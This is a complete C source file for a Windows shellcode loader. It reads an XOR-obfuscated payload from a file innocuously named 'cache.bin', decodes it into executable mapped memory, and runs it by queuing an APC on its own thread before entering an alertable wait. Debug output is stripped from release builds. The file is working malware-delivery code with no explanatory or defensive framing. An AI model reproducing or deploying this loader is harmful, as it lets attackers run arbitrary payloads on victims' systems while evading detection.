#include <Windows.h>
#include <stdio.h>

#ifdef _DEBUG
#define DBG(fmt, ...) printf(fmt, __VA_ARGS__)
#else
#define DBG(fmt, ...) ((void)0)
#endif

#define MAX_SHELLCODE_SIZE (1024 * 1024 * 100)
#define KEY 0x55

__declspec(noinline) void XOR(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PBYTE pbBuffer) {

	for (SIZE_T i = 0; i < sPayloadSize; i++) {
		pbBuffer[i] = pPayload[i] ^ KEY;
	}
}

PBYTE LoadShellcode(IN LPCWSTR lpPath, OUT PDWORD lpdwSize) {

	HANDLE        hFile      = INVALID_HANDLE_VALUE;
	PBYTE         pbBuffer   = NULL;
	DWORD         dwSize     = 0;
	DWORD         dwByteRead = 0;
	LARGE_INTEGER liFileSize = { 0 };

	hFile = CreateFileW(lpPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		DBG("[-] CreateFileW failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (!GetFileSizeEx(hFile, &liFileSize))	{
		DBG("[-] GetFileSizeEx failed: %lu\n", GetLastError());
		goto _EndOfFunc;
	}

	if (liFileSize.QuadPart == 0 || liFileSize.QuadPart > MAX_SHELLCODE_SIZE) {
		DBG("[-] Invalid shellcode size: %lld\n", liFileSize.QuadPart);
		goto _EndOfFunc;
	}

	dwSize = (DWORD)liFileSize.QuadPart;

	pbBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, dwSize);
	if (pbBuffer == NULL) {
		DBG("[-] HeapAlloc failed\n");
		goto _EndOfFunc;
	}

	if (!ReadFile(hFile, pbBuffer, dwSize, &dwByteRead, NULL) || dwByteRead != dwSize) {
		DBG("[-] ReadFile failed: %lu (read=%lu, expected=%lu)\n", GetLastError(), dwByteRead, dwSize);
		HeapFree(GetProcessHeap(), 0, pbBuffer);
		pbBuffer = NULL;
	}

	*lpdwSize = dwSize;


_EndOfFunc:
	if (hFile != INVALID_HANDLE_VALUE) {
		CloseHandle(hFile);
	}


	return pbBuffer;
}

BOOL RunViaApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayloadSize) {

	PBYTE  pAddress        = NULL;
	HANDLE hFile           = NULL;
	DWORD  dwOldProtection = 0;
	BOOL   bSuccess        = FALSE;

	hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
	if (hFile == NULL) {
		DBG("[-] CreateFileMappingW failed :%lu\n", GetLastError());
		bSuccess = FALSE;
		goto cleanup;
	}
	
	pAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
	if (pAddress == NULL) {
		DBG("[-] MapViewOfFile failed :%lu\n", GetLastError());
		bSuccess = FALSE;
		goto cleanup;
	}

	XOR(pPayload, sPayloadSize, pAddress);

	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, (ULONG_PTR)NULL)) {
		DBG("[-] QueueUserAPC failed :%lu\n", GetLastError());
		goto cleanup;
	}

	bSuccess = TRUE;

cleanup:
	if (!bSuccess) {
		if (pAddress != NULL) UnmapViewOfFile(pAddress);
		if (hFile != NULL) CloseHandle(hFile);
	}
	return bSuccess;
}

int main(void) {

	DWORD dwShellcodeSize = 0;
	PBYTE pbShellcode     = LoadShellcode(L"cache.bin", &dwShellcodeSize);

	if (pbShellcode == NULL) {
		return 1;
	}

	//DBG("Loaded %lu bytes at %p\n", dwShellcodeSize, pbShellcode);

	HANDLE hThread = GetCurrentThread();

	if (!RunViaApcInjection(hThread, pbShellcode, dwShellcodeSize)) {
		DBG("[-] RunViaApcInjection failed :%lu\n", GetLastError());
		HeapFree(GetProcessHeap(), 0, pbShellcode);
		return 1;
	}

	HANDLE hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	if (hEvent) {
		WaitForMultipleObjectsEx(1, &hEvent, TRUE, INFINITE, TRUE);
		CloseHandle(hEvent);
	}
	
	HeapFree(GetProcessHeap(), 0, pbShellcode);

	return 0;
}